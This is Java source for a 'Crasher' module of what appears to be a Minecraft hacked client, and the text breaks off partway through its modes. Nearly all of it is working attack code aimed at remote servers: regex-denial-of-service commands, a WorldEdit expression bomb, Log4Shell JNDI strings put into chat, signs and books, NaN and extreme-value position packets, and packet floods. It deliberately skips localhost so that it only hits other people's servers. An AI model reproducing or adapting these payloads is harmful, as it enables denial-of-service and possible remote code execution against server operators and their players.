@ModuleInfo(name = "Crasher", description = "Crashes some servers", category = Category.OTHER)
public final class Crasher extends Module {

    private final ModeSetting mode = new ModeSetting("Mode", this, "Pex", "Pex", "Multiverse", "FAWE", "Log4J", "Invalid Move", "Rotation", "Sign", "Book", "Chunk", "NaN", "Fly", "Click", "Block Click", "Window", "BEdit", "Mare", "Interact", "One Packet", "AAC5");
    private final NumberSetting packets = new NumberSetting("Packets", this, 10, 1, 100, 1);

    @Override
    public void onUpdateAlwaysInGui() {
        packets.hidden = !(mode.is("Mare") || mode.is("Interact"));
    }

    @Override
    public void onPreMotion(final PreMotionEvent event) {
        if (mc.isIntegratedServerRunning() || PlayerUtil.isOnServer("127.0.0.1") || PlayerUtil.isOnServer("localhost"))
            return;

        if (mc.thePlayer.ticksExisted < 5) {
            this.toggleModule();
            this.registerNotification("Disabled " + this.getModuleInfo().name() + " due to world change.");
            return;
        }

        switch (mode.getMode()) {
            case "Pex": {
                if (mc.thePlayer.ticksExisted % 20 == 0) {
                    mc.thePlayer.sendChatMessage("/pex promote a a");
                    mc.thePlayer.sendChatMessage("/pex promote b b");
                }
                break;
            }

            case "Multiverse": {
                if (mc.thePlayer.ticksExisted % 20 == 0)
                    mc.thePlayer.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                break;
            }

            case "FAWE": {
                PacketUtil.sendPacketWithoutEvent(new C14PacketTabComplete("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                break;
            }

            case "Log4J": {
                mc.thePlayer.sendChatMessage("/ ${jndi:rmi://localhost:3000}");

                this.toggleModule();
                this.registerNotification("Attempted to crash the server.");
                break;
            }

            case "Invalid Move": {
                PacketUtil.sendPacket(new C03PacketPlayer.C06PacketPlayerPosLook(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, event.isGround()));
                break;
            }

            case "Rotation": {
                PacketUtil.sendPacket(new C03PacketPlayer.C05PacketPlayerLook(9.223372E18F, 9.223372E18F, event.isGround()));
                break;
            }

            case "Sign": {
                final IChatComponent[] text = new IChatComponent[]{new ChatComponentText("${jndi:rmi://localhost:3000}")};
                PacketUtil.sendPacket(new C12PacketUpdateSign(BlockPos.ORIGIN, text));
                break;
            }

            case "Book": {
                final NBTTagCompound comp = new NBTTagCompound();
                final NBTTagList list = new NBTTagList();

                list.appendTag(new NBTTagString("${jndi:rmi://localhost:3000}"));

                comp.setString("author", "${jndi:rmi://localhost:3000}");
                comp.setString("title", "${jndi:rmi://localhost:3000}");
                comp.setByte("resolved", (byte) 1);
                comp.setTag("pages", list);
                final ItemStack stack = new ItemStack(Items.writable_book);
                stack.setTagCompound(comp);
                final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                buffer.writeItemStackToBuffer(stack);
                PacketUtil.sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
                break;
            }

            case "Chunk": {
                double x = mc.thePlayer.posX, y = mc.thePlayer.posY, z = mc.thePlayer.posZ;

                for (int i = 0; i < 32000; i++)
                    PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(x++, y >= 255 ? 255 : y++, z++, true));
                break;
            }

            case "NaN": {
                PacketUtil.sendPacket(new C03PacketPlayer.C06PacketPlayerPosLook(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, event.isGround()));
                break;
            }

            case "Fly": {
                double y = 0, z;
                int i;

                for (i = 0; i < 200; i++) {
                    y = i * 9;
                    PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY + y, mc.thePlayer.posZ, false));
                }

                for (i = 0; i < 10000; i++) {
                    z = i * 9;
                    PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY + y, mc.thePlayer.posZ + z, false));
                }
                break;
            }

            case "Block Click": {
                PacketUtil.sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, new ItemStack(Blocks.piston_head), (short) 0));
                break;
            }

            case "Click": {
                for (int c = 0; c < 30; c++) {
                    final NBTTagCompound comp = new NBTTagCompound();
                    final NBTTagList list = new NBTTagList();

